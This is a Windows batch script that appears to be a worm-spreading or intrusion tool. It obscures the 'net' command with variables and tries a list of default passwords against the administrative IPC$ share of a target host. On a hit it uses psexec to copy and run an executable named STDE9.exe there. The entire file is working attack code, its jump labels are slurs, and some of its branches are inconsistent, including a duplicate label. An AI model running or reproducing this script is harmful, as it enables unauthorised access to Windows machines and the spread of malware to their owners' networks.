@echo off
set A=n
set B=e
set C=t
%A%%B%%C% use \\%1\ipc$ "" /user:Administrator
if not errorlevel 1 goto yeP
%A%%B%%C% use \\%1\ipc$ "Administrator" /user:Administrator
if not errorlevel 1 goto yeP
%A%%B%%C% use \\%1\ipc$ "test" /user:Administrator
if not errorlevel 1 goto whore
%A%%B%%C% use \\%1\ipc$ "test" /user:test
if not errorlevel 1 goto testt
%A%%B%%C% use \\%1\ipc$ "test123" /user:Administrator
if not errorlevel 1 goto cunt
%A%%B%%C% use \\%1\ipc$ "temp" /user:Administrator
if not errorlevel 1 goto pussy
%A%%B%%C% use \\%1\ipc$ "temp123" /user:Administrator
if not errorlevel 1 goto haha
%A%%B%%C% use \\%1\ipc$ "pass" /user:Administrator
if not errorlevel 1 goto homo
%A%%B%%C% use \\%1\ipc$ "password" /user:Administrator
if not errorlevel 1 goto thynk
%A%%B%%C% use \\%1\ipc$ "admin" /user:Administrator
if not errorlevel 1 goto blowme
%A%%B%%C% use \\%1\ipc$ "root" /user:root
if not errorlevel 1 goto queer
%A%%B%%C% use \\%1\ipc$ "changeme" /user:Administrator
if not errorlevel 1 goto hoe
net use \\%1\ipc$ "admin" /user:admin
if not errorlevel 1 goto dike
goto end
:yeP
psexec \\%1 -u Administrator -p "" -d attrib.exe -r STDE9.exe
psexec \\%1 -u Administrator -p "" -f -c -d STDE9.exe -o
psexec \\%1 -u Administrator -p "" -d STDE9.exe -o
goto end
:yeP
psexec \\%1 -u Administrator -p "admin" -d attrib.exe -r STDE9.exe
psexec \\%1 -u Administrator -p "admin" -f -c -d STDE9.exe -o
psexec \\%1 -u Administrator -p "admin" -d STDE9.exe -o
goto end
:blowme
psexec \\%1 -u Administrator -p "administrator" -d attrib.exe -r STDE9.exe
psexec \\%1 -u Administrator -p "administrator" -f -c -d STDE9.exe -o
psexec \\%1 -u Administrator -p "administrator" -d STDE9.exe -o
goto end
:queer
psexec \\%1 -u root -p "root" -d attrib.exe -r STDE9.exe
psexec \\%1 -u root -p "root" -f -c -d STDE9.exe -o
psexec \\%1 -u root -p "root" -d STDE9.exe -o
goto end
:dike
psexec \\%1 -u admin -p "admin" -d attrib.exe -r STDE9.exe
psexec \\%1 -u admin -p "admin" -f -c -d STDE9.exe -o
psexec \\%1 -u admin -p "admin" -d STDE9.exe -o
goto end
:whore
psexec \\%1 -u administrator -p "test" -d attrib.exe -r STDE9.exe
psexec \\%1 -u administrator -p "test" -f -c -d STDE9.exe -o
psexec \\%1 -u administrator -p "test" -d STDE9.exe -o
goto end
:testt
psexec \\%1 -u test -p "test" -d attrib.exe -r STDE9.exe
psexec \\%1 -u test -p "test" -f -c -d STDE9.exe -o
psexec \\%1 -u test -p "test" -d STDE9.exe -o
goto end
:cunt
psexec \\%1 -u administrator -p "test123" -d attrib.exe -r STDE9.exe
psexec \\%1 -u administrator -p "test123" -f -c -d STDE9.exe -o
psexec \\%1 -u administrator -p "test123" -d STDE9.exe -o
goto end
:pussy
psexec \\%1 -u administrator -p "temp" -d attrib.exe -r STDE9.exe
psexec \\%1 -u administrator -p "temp" -f -c -d STDE9.exe -o
psexec \\%1 -u administrator -p "temp" -d STDE9.exe -o
goto end
:haha
psexec \\%1 -u administrator -p "temp123" -d attrib.exe -r STDE9.exe
psexec \\%1 -u administrator -p "temp123" -f -c -d STDE9.exe -o
psexec \\%1 -u administrator -p "temp123" -d STDE9.exe -o
goto end
:homo
psexec \\%1 -u administrator -p "pass" -d attrib.exe -r STDE9.exe
psexec \\%1 -u administrator -p "pass" -f -c -d STDE9.exe -o
psexec \\%1 -u administrator -p "pass" -d STDE9.exe -o
goto end
:thynk
psexec \\%1 -u administrator -p "password" -d attrib.exe -r STDE9.exe
psexec \\%1 -u administrator -p "password" -f -c -d STDE9.exe -o
psexec \\%1 -u administrator -p "password" -d STDE9.exe -o
goto end
:hoe
psexec \\%1 -u administrator -p "changeme" -d attrib.exe -r STDE9.exe
psexec \\%1 -u administrator -p "changeme" -f -c -d STDE9.exe -o
psexec \\%1 -u administrator -p "changeme" -d STDE9.exe -o
goto end
:end
